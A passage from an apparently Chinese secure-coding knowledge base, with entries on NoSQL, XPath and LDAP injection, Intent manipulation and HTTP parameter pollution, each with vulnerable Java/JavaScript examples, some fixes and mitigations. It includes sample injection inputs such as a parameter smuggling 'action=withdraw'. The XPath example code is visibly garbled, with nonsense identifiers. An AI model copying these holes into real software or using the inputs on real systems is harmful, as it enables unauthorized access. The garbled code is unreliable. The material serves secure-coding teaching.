<p>相比于传统的SQL数据库，NoSQL的一致性要求相对宽松。通过削弱关系上的限制以及减少一致性检查，NoSQL拥有更好的性能以及在拓展时更易受益。尽管NoSQL不使用传统的SQL语法，他们同样存在受到注入攻击的风险。</p>
<h1 id="_2">漏洞与风险</h1>
<p>相比发生在声明式SQL语言中，因为NoSQL注入攻击可能发生在过程式语言里，NoSQL注入攻击可能会造成比传统的SQL注入攻击更严重的后果。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>尽可能用最低的运行权限来完成需要完成的任务。</li>
<li>视所有的输入为危险的数据，通过使用白名单等的受信输入验证策略来严格清洗输入数据。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>下面的缺陷代码没有对用户输入进行清洗，直接将用户输入传到了MongoDB的查询语句中：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="nx">active</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">$where</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="nx">$userInput</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);;</span>
</pre></div>
</td></tr></table>
<p>尽管查询语句中没有任何有关用户数据的依赖，攻击者还是能够利用MongoDB的缺陷，用恶意数据替换掉操作符：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="nx">$where</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);</span>
</pre></div>
</td></tr></table>
<h1 id="_7">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Testing_for_NoSQL_injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1096">XPath注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>可拓展的标识语言（Extensible Markup Language，XML）可以像关系型数据库般用作数据存储。开发者会频繁地通过使用XPath来从这样的一个XML文档中检索数据。当提供给XPath检索例程的数据没有经过合理的清洗时，将有可能发生XPath注入攻击。</p>
<h1 id="_2">漏洞与风险</h1>
<p>此攻击与SQL注入或XML注入类似，攻击者能够在正在使用的查询语句的数据字段中插入有效的SQL或XML结构。在典型的攻击事件中，查询语句中的条件字段会解析成重复的语义，或者给攻击者提供需要额外权限才能访问的信息的访问权。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>将所有的用户输入视作不受信的，并进行合理的清洗。</li>
<li>在清洗用户输入的过程中，要对数据类型、长度、格式以及数据内容的正确性进行验证。</li>
<li>在典型的客户端-服务器端的应用程序中，客户端以及服务器端两者都需要对数据进行验证。</li>
<li>彻底地对会提供、传播或接收用户输入的程序进行测试。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>以下的缺陷代码从用户输入的数据中获取用户名以及密码信息，并将它们用作查询语句的构造：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">doLogin</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span><span class="o">)</span>
  <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">XPathExpressionException</span> <span class="o">{</span>

  <span class="n">DocumentBuilderFactory</span> <span class="n">domFactory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">domFactory</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">domFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
  <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"users.xml"</span><span class="o">);</span>
  <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span> <span class="n">password</span><span class="o">);</span>
 <span class="n">gouzao</span>
 <span class="n">gouzaoy</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">XPathFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
 <span class="n">gouzao</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newXPath</span><span class="o">();</span>
 <span class="n">gouzaosion</span> <span class="n">expr</span> <span class="o">=</span> <span class="n">xpath</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">"//users/user[username/text()='"</span> <span class="o">+</span>
 <span class="n">gouzaome</span> <span class="o">+</span> <span class="s">"' and password/text()='"</span> <span class="o">+</span> <span class="n">pwd</span> <span class="o">+</span> <span class="s">"' ]"</span><span class="o">);</span>
 <span class="n">gouzaolt</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="na">evaluate</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">XPathConstants</span><span class="o">.</span><span class="na">NODESET</span><span class="o">);</span>
 <span class="n">gouzaodes</span> <span class="o">=</span> <span class="o">(</span><span class="n">NodeList</span><span class="o">)</span> <span class="n">result</span><span class="o">;</span>

  <span class="c1">// Print first names to the console</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">1</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span> <span class="s">"Authenticated: "</span> <span class="o">+</span> <span class="n">node</span><span class="o">.</span><span class="na">getNodeValue</span><span class="o">());</span>
  <span class="o">}</span>

  <span class="k">return</span> <span class="o">(</span><span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">漏洞代码修复示例</h3>
<p>下面的合规解决方案通过读取要求格式的文件而从中获取查询语句，并在一个<code>Map</code>中插入查询所需要的用户名、密码信息。而后XQuery库从这些输入中构造XML查询语句：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">doLogin</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="n">String</span> <span class="n">pwd</span><span class="o">)</span>
  <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">XPathExpressionException</span> <span class="o">{</span>

  <span class="n">DocumentBuilderFactory</span> <span class="n">domFactory</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
  <span class="n">domFactory</span><span class="o">.</span><span class="na">setNamespaceAware</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">domFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
  <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"users.xml"</span><span class="o">);</span>

  <span class="n">XQuery</span> <span class="n">xquery</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XQueryFactory</span><span class="o">().</span><span class="na">createXQuery</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"login.xq"</span><span class="o">));</span>
  <span class="n">Map</span> <span class="n">queryVars</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
  <span class="n">queryVars</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"userName"</span><span class="o">,</span> <span class="n">userName</span><span class="o">);</span>
  <span class="n">queryVars</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
  <span class="n">NodeList</span> <span class="n">nodes</span> <span class="o">=</span> <span class="n">xquery</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">queryVars</span><span class="o">).</span><span class="na">toNodes</span><span class="o">();</span>

  <span class="c1">// Print first names to the console</span>
  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">nodes</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">1</span><span class="o">).</span><span class="na">getChildNodes</span><span class="o">().</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">node</span><span class="o">.</span><span class="na">getNodeValue</span><span class="o">());</span>
  <span class="o">}</span>

  <span class="k">return</span> <span class="o">(</span><span class="n">nodes</span><span class="o">.</span><span class="na">getLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="_8">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS53-J.+Prevent+XPath+Injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1097">LDAP操纵</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>轻量级目录访问协议（Lightweight Directory Access Protocol, LDAP）使得程序能够远程地进行像查找或修改目录中的记录的操作。</p>
<h1 id="_2">漏洞与风险</h1>
<p>LDAP注入源于不充分的用户输入清洗、验证，进而允许恶意用户使用目录服务来窃取限制性的信息。不足以防御LDAP注入的认证过程使得未经认证用户能够登录到系统。同样的，攻击者可以通过查找例程来发掘目录中的部分或全部信息。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>视所有的输入为危险的数据，通过使用白名单等的受信输入验证策略来严格清洗输入数据。</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>以下的缺陷代码允许<code>searchRecord()</code>方法的调用者使用LDAP协议来搜索目录中的某个记录：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "S*"; // Invalid</span>
<span class="c1">// String userPassword = "*"; // Invalid</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LDAPInjection</span> <span class="o">{</span>       
  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">searchRecord</span><span class="o">(</span><span class="n">String</span> <span class="n">userSN</span><span class="o">,</span> <span class="n">String</span> <span class="n">userPassword</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>        
    <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span>  <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
    <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">DirContext</span> <span class="n">dctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>

      <span class="n">SearchControls</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchControls</span><span class="o">();</span>
      <span class="n">String</span><span class="o">[]</span> <span class="n">attributeFilter</span> <span class="o">=</span> <span class="o">{</span><span class="s">"cn"</span><span class="o">,</span> <span class="s">"mail"</span><span class="o">};</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setReturningAttributes</span><span class="o">(</span><span class="n">attributeFilter</span><span class="o">);</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

      <span class="c1">// The following resolves to (&amp;(sn=S*)(userPassword=*))     </span>
      <span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn="</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

      <span class="n">NamingEnumeration</span><span class="o">&lt;?&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">dctx</span><span class="o">.</span><span class="na">search</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">filter</span><span class="o">,</span> <span class="n">sc</span><span class="o">);</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">results</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">SearchResult</span> <span class="n">sr</span> <span class="o">=</span> <span class="o">(</span><span class="n">SearchResult</span><span class="o">)</span> <span class="n">results</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">Attributes</span> <span class="n">attrs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attributes</span><span class="o">)</span> <span class="n">sr</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">();</span>
        <span class="n">Attribute</span> <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"cn"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mail"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
      <span class="o">}</span>    
      <span class="n">dctx</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">漏洞代码修复示例</h3>
<p>以下合规的解决方案使用了白名单来清洗用户输入，清洗后得出的字符串中只包含有效的字符。在这段代码中，<code>userSN</code>可能只包含字母或空格字符，而<code>password</code>则只可能包含有效的字母数字字符：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>
<span class="c1">// String userPassword = "secret2";   // Valid</span>

<span class="c1">// ... beginning of LDAPInjection.searchRecord()...</span>
<span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
<span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(!</span><span class="n">userSN</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w\\s]*"</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">userPassword</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Invalid input"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn = "</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

<span class="c1">// ... remainder of LDAPInjection.searchRecord()...    </span>
</pre></div>
</td></tr></table>
<h1 id="_8">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS54-J.+Prevent+LDAP+injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1110">意图操纵</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>该软件没有或不妥当地限制从上游设备中接收到的输入数据，并将该数据用作某个资源的修饰符，这可能会使得该资源处于预料的控制范围之外。</p>
<h1 id="_2">漏洞与风险</h1>
<p>攻击者能够利用Intent参数中的漏洞，进而控制程序往后的行为。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<p>视所有的输入为危险的数据，通过使用白名单等的受信输入验证策略来严格清洗输入数据。</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>下面的缺陷代码对HTTP请求中的参数不加验证，直接使用：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">String</span> <span class="n">cName</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"className"</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
<span class="o">...</span>
<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">cName</span><span class="o">);</span>
<span class="n">someContext</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h1 id="_7">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/99.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1104">HTTP参数污染</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>攻击者通过在查询字符串中注入定界符，重写或增加了HTTP GET/POST参数。</p>
<h1 id="_2">漏洞与风险</h1>
<p>通过HTTP参数污染（HTTP Parameter Pollution, HPP），攻击者能够重写硬编码的HTTP参数、修改程序的行为、访问甚至利用无法控制的变量，以及越过输入数据检查点和WAF（Web Application Firewall）规则。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>如果正在使用Web应用防火墙，那么请确保过滤器配置正确，能够探测到异常的HTTP请求。</li>
<li>对URL进行编码。</li>
<li>在URL重写中使用严格的正则表达式。</li>
<li>警惕一条查询语句中反复出现的参数。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>假设有如下的代码：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kd">private</span> <span class="nf">executeBackendRequest</span><span class="o">(</span><span class="n">HTTPRequest</span> <span class="n">request</span><span class="o">){</span>
    <span class="n">String</span> <span class="n">amount</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"amount"</span><span class="o">);</span>
    <span class="n">String</span> <span class="n">beneficiary</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"recipient"</span><span class="o">);</span>
    <span class="n">HttpRequest</span><span class="o">(</span><span class="s">"http://backendServer.com/servlet/actions"</span><span class="o">,</span><span class="s">"POST"</span><span class="o">,</span>
                <span class="s">"action=transfer&amp;amount="</span><span class="o">+</span><span class="n">amount</span><span class="o">+</span><span class="s">"&amp;recipient="</span><span class="o">+</span><span class="n">beneficiary</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>恶意的用户可能会发起一个这样的请求：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>http://frontendHost.com/page?amount=1000&amp;recipient=Mat%26action%3dwithdraw
</pre></div>
</td></tr></table>
<p>前端会为后端构造出这样的请求：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">HttpRequest</span><span class="o">(</span><span class="s">"http://backendServer.com/servlet/actions"</span><span class="o">,</span><span class="s">"POST"</span><span class="o">,</span>
            <span class="s">"action=transfer&amp;amount="</span><span class="o">+</span><span class="n">amount</span><span class="o">+</span><span class="s">"&amp;recipient="</span><span class="o">+</span><span class="n">beneficiary</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>也就是：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>action=transfer&amp;amount=1000&amp;recipient=Mat&amp;action=withdraw
</pre></div>
</td></tr></table>
<h1 id="_7">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-capec">
<p>http://capec.mitre.org/data/definitions/460.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
